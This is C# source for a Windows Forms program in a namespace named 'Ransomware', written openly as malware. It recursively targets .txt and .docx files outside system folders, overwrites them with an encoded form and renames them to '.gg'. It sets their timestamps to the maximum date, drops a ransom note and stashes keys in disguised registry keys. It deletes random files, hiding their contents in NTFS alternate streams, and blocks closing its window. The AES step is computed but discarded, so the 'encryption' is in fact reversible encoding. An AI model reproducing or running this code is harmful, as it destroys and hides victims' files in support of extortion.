using System;
using System.Collections.Generic;

using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using SHDocVw;
using CodeFluent.Runtime.BinaryServices;
using System.Collections;
using System.ServiceProcess;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace Ransomware
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        
        public static string EXT = ".gg";
        public static string INSTRUCT = "InStrucT1onss.txt";
        public static List<string> ENLIST = new List<string>() { ".txt", ".docx" };
        public static List<string> ITEMS = new List<string>();
        public static List<string> RANDOMFILELIST = new List<string>();
        public static string Path1 = @"C:\Windows\Temp";
        public static string Path2 = "OriginalPath.txt";
        public static string ORIGINALPATH = Path.Combine(Path1, Path2);
        public static string Path3 = "EncPath.txt";
        public static string ENCPATH = Path.Combine(Path1, Path3);
        public static string Path4 = "DeletedItems.txt";
        public static string DELETED = Path.Combine(Path1, Path4);

        public static string NOTICE = "DO NOT DELETE THIS FILE!! THIS FILE IS USED FOR DECRYPTION";

        public static string DIRPATH = "";


        public void LoopThroughDir(string filePath) {
            try
            {
                string[] files = getFiles(filePath);

                for(int i = 0; i<files.Length; i++)
                {
                    string fileExt = Path.GetExtension(files[i]);
                    bool isTargetFile = isTarget(fileExt, files[i]);
       
                    if (isTargetFile)
                    {
                        encrypt(files[i]);
                        addFilePath(files[i]);
                    }

                    createInstruction(filePath);
                }

                string[] fileObj = getDirectories(filePath);
                for(int i=0; i<fileObj.Length; i++)
                {
                    bool isTargetDirectory = isTargetDir(fileObj[i]);
                    if (isTargetDirectory)
                    {
                        LoopThroughDir(fileObj[i]);
                        chMetaData(fileObj[i]);
                    }
                }
            }
            catch (Exception e) {
            }
        }

        private string[] getFiles(string parentDir)
        {
            string[] files = Directory.GetFiles(parentDir);
            return files;
        }

        private Boolean isTarget(string fileExt, string fileName)
        {
            if (string.Equals(fileExt, EXT) == false)
            {
                if (ENLIST.Contains(fileExt) && (!(Path.GetFileName(fileName).Equals(INSTRUCT) || fileName.Equals(ORIGINALPATH) || fileName.Equals(ENCPATH) || fileName.Equals(DELETED))))
                {
                    return true;
                }
            }
            return false;
        }

        private void createInstruction(string filePath)
        {
            string fileName = filePath + "\\" + INSTRUCT;
            if (!Directory.Exists(fileName))
            {
                using (StreamWriter sw = new StreamWriter(fileName))
                {
                    sw.WriteLine("!!!!!ATTENTION!!!!!!!!!");
                    sw.WriteLine("Your files hve been encrypted");
                }
                chMetaData(fileName);
            }
        }

        private string[] getDirectories(string parentDir)
        {
            string[] Dirs = Directory.GetDirectories(parentDir);
            return Dirs;
        }

        private Boolean isTargetDir(string directory)
        {
            if (!directory.Contains("System Volume Information") && !directory.ToUpper().Contains("$RECYCLE.BIN") && !directory.Contains("Program Files") && !directory.Contains("System32"))
            {
                return true;
            }
            return false;
        }

        private byte[] encryptAES(byte[] bytes, byte[] key, byte[] IV) {
            if (bytes == null || bytes.Length < 0)
                throw new ArgumentNullException("Content error");
            if (key == null || key.Length < 0)
                throw new ArgumentNullException("Key error");
            if (IV == null || IV.Length < 0)
                throw new ArgumentNullException("IV error");

            byte[] encrypted;
            using (RijndaelManaged RijMng = new RijndaelManaged()) {
                RijMng.Key = key;
                RijMng.IV = IV;
                RijMng.Mode = CipherMode.CBC;
                RijMng.Padding = PaddingMode.Zeros;

                ICryptoTransform encryptor = RijMng.CreateEncryptor(RijMng.Key, RijMng.IV);

                using (MemoryStream msEncrypt = new MemoryStream()) {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt)) {
                            swEncrypt.Write(bytes);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }

            }

            return encrypted;
        }

        private void addFilePath(string f) {
            try
            {
                if (File.Exists(ORIGINALPATH))
                {
                    using (StreamWriter streamWriter = new StreamWriter(ORIGINALPATH,true)) {
                        streamWriter.WriteLine(f);
                    }
                }
                else {

                    using (StreamWriter sw = new StreamWriter(ORIGINALPATH))
                    {
                        sw.WriteLine(NOTICE);
                        sw.WriteLine(f);
                    }
                }

                if (File.Exists(ENCPATH)) {
                    using (StreamWriter streamWriter = new StreamWriter(ENCPATH, true))
                    {
                        var halfPath = Path.Combine(Path.GetDirectoryName(f), Path.GetFileNameWithoutExtension(f));
                        string file = halfPath + EXT;
                        streamWriter.WriteLine(file);
                    }
                }
                else
                {

                    using (StreamWriter sw = new StreamWriter(ENCPATH))
                    {
                        sw.WriteLine(NOTICE);
                        var halfPath = Path.Combine(Path.GetDirectoryName(f), Path.GetFileNameWithoutExtension(f));
                        string file = halfPath + EXT;
                        sw.WriteLine(file);
                    }
                }

            }
            catch (Exception e) {
            }
        }


        private void encrypt(string file) {            
            try
            {
                if (new FileInfo(file).Length > 0)
                {
                    //base85 encoding, Write encodedStr to file, change file metadata
                    byte[] fileBytes = File.ReadAllBytes(file);
                    string encodedStr = Encode(fileBytes);

                    using (StreamWriter sw = new StreamWriter(file))
                    {
                        sw.WriteLine(encodedStr);                                      
                    }
                    changeExt(file);

                    using (RegistryKey regK = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\win", true))
                    {
                        if (regK != null)
                        {
                            int count = (int)regK.GetValue("encNum");
                            regK.SetValue("encNum", count + 1);
                        }
                    }
                }
            }
            catch (Exception ex) {
            }
        }

        private void changeExt(string file)
        {
            try
            {
                string previousPath = Path.GetDirectoryName(file);
                String previousFile = Path.GetFileNameWithoutExtension(file);
                string endFile = previousPath + "\\" + previousFile + EXT;
                if (File.Exists(endFile))
                {                      
                }
                else if (File.Exists(file)){
                    File.Move(file, endFile);
                }
                else {                  
                    return;
                }

                chMetaData(endFile);
            }
            catch (Exception ex) {
            }
        }

        const int SW_SHOWMINNOACTIVE = 7;

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void MinimizeWindow(IntPtr handle)
        {
            ShowWindow(handle, SW_SHOWMINNOACTIVE);
        }

        private void chMetaData(string endFile) {
            try
            {
                DateTime dt = DateTime.MaxValue;
                FileAttributes attr = File.GetAttributes(endFile);

                if (attr.HasFlag(FileAttributes.Directory))
                {
                    Directory.SetLastAccessTime(endFile, dt);
                    Directory.SetCreationTime(endFile, dt);
                    Directory.SetLastWriteTime(endFile, dt);
                }
                else
                {
                    File.SetCreationTime(endFile, dt);
                    File.SetLastAccessTime(endFile, dt);
                    File.SetLastWriteTime(endFile, dt);
                }
            }
            catch (Exception ex) {
            }

        }

        public Boolean deletefile(string filePath, int deleteFiles = -1)
        {
            Boolean bol = false;
            try
            {
                string fullPath = "";
                string value = "";
                string baseName = "";
                string p = getRandomFile(filePath);
                if (string.IsNullOrEmpty(p)==false)
                {
                    RANDOMFILELIST.Clear();
                    baseName = System.IO.Path.GetFileName(p);
                    string Path = p;
                    if (File.Exists(Path))
                    {
                        using (StreamReader sr = new StreamReader(Path))
                        {
                            value = sr.ReadToEnd();
                        }

                        if (File.Exists(System.IO.Path.GetDirectoryName(p) + "\\" + INSTRUCT))
                        {
                            fullPath = System.IO.Path.GetDirectoryName(p) + "\\" + INSTRUCT + ":" + baseName;
                            FileStream stream = NtfsAlternateStream.Open(fullPath, FileAccess.Write, FileMode.OpenOrCreate, FileShare.None);
                            stream.Close();
                            NtfsAlternateStream.WriteAllText(fullPath, value);
                        }
                    }

                    if (File.Exists(p))
                    {
                        File.SetAttributes(p, FileAttributes.Normal);
                        File.Delete(p);
                        if (File.Exists(DELETED))
                        {
                            using (StreamWriter streamWriter = new StreamWriter(DELETED, true))
                            {
                                streamWriter.WriteLine(p);
                            }
                        }
                        else
                        {
                            using (StreamWriter sw = new StreamWriter(DELETED))
                            {
                                sw.WriteLine(p);
                            }
                        }
                    }

                    string tempFile = System.IO.Path.GetTempFileName();
                    using (var sr = new StreamReader(ENCPATH)) {
                        using (var sw = new StreamWriter(tempFile)) {
                            string line;
                            while ((line = sr.ReadLine()) != null) {
                                if (line != p) {
                                    sw.WriteLine(line);
                                }
                            }
                        }
                    }
                    File.Delete(ENCPATH);
                    File.Move(tempFile, ENCPATH);
                }
                else {
                    bol = true;
                }

            }catch (System.Runtime.InteropServices.COMException)
            {
                string[] files = Directory.GetFiles(filePath);
                foreach (string f in files)
                {
                    if (string.Equals(Path.GetFileName(f), INSTRUCT))
                    {
                        File.SetAttributes(f, FileAttributes.Normal);
                    }
                    else
                    {
                        File.SetAttributes(f, FileAttributes.Hidden);
                    }
                }
            }
            catch (Exception e) {
            }
            return bol;
        }

        private string getRandomFile(string filePath)
        {
            string file = null;
            if (System.IO.File.Exists(ENCPATH))
            {
                var lines = File.ReadAllLines(ENCPATH);
                var r = new Random();
                if (lines.Length > 1)
                {
                    var lineNum = r.Next(1, lines.Length - 1);
                    file = lines[lineNum];
                }
                else {
                    file = null;
                }

            }
            return file;
        }

        public string Encode(byte[] bytes)
        {
            if (bytes == null)
                throw new ArgumentNullException("bytes");

            string enc1 = "";
            using (RijndaelManaged Rij = new RijndaelManaged())
            {
                Rij.GenerateKey();
                Rij.GenerateIV();

                byte[] encrypted = encryptAES(bytes, Rij.Key, Rij.IV);

                RegistryKey regKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft", true);
                if (!regKey.GetSubKeyNames().Contains("Services"))
                {
                    regKey.CreateSubKey("Services");
                    regKey.OpenSubKey("services", true);

                    RegistryKey regK = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Services", true);
                    regK.SetValue("KeyValue", Rij.Key);

                    regK.SetValue("IVvalue", Rij.IV);
                }

                if (!regKey.GetSubKeyNames().Contains("win"))
                {
                    regKey.CreateSubKey("win");
                    regKey.OpenSubKey("win", true);

                    RegistryKey regK = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\win", true);
                    string str = "";
                    Random rdm = new Random();
                    int num = rdm.Next(1000, 9999);
                    str = num + DateTime.Now.ToString();
                    byte[] bA = Encoding.ASCII.GetBytes(str);
                    regK.SetValue("keyy", bA);
                    regK.SetValue("encNum", 0);
                }

                StringBuilder strB = new StringBuilder();
                foreach (byte b in encrypted) {
                    strB.Append(b.ToString()+" ");
                }
                Debug.WriteLine("Encrypted string is :" + strB);
                string enc2 = strB.ToString().Trim();
            }

            StringBuilder sb = new StringBuilder(bytes.Length * 5 / 4);
            int count = 0;
            uint value = 0;
            foreach (byte b in bytes)
            {
                value |= ((uint)b) << (24 - (count * 8));
                count++;

                if (count == 4)
                {
                    if (value == 0)
                        sb.Append('z');
                    else
                        EncodeValue(sb, value, 0);
                    count = 0;
                    value = 0;
                }
            }
            if (count > 0)
                EncodeValue(sb, value, 4 - count);

            enc1 = sb.ToString().Trim();
            return enc1;
        }

        // Writes the Ascii85 characters for a 32-bit value to a StringBuilder.
        private void EncodeValue(StringBuilder sb, uint value, int paddingBytes)
        {
            char[] encoded = new char[5];

            for (int index = 4; index >= 0; index--)
            {
                encoded[index] = (char)((value % 85) + c_firstCharacter);
                value /= 85;
            }

            if (paddingBytes != 0)
                Array.Resize(ref encoded, 5 - paddingBytes);

            sb.Append(encoded);
        }

        // the first and last characters used in the Ascii85 encoding character set
        const char c_firstCharacter = '!';
        const char c_lastCharacter = 'u';

        static readonly uint[] s_powersOf85 = new uint[] { 85u * 85u * 85u * 85u, 85u * 85u * 85u, 85u * 85u, 85u, 1 };

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            MessageBox.Show("Do not close this!");
            e.Cancel = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }


    }
}
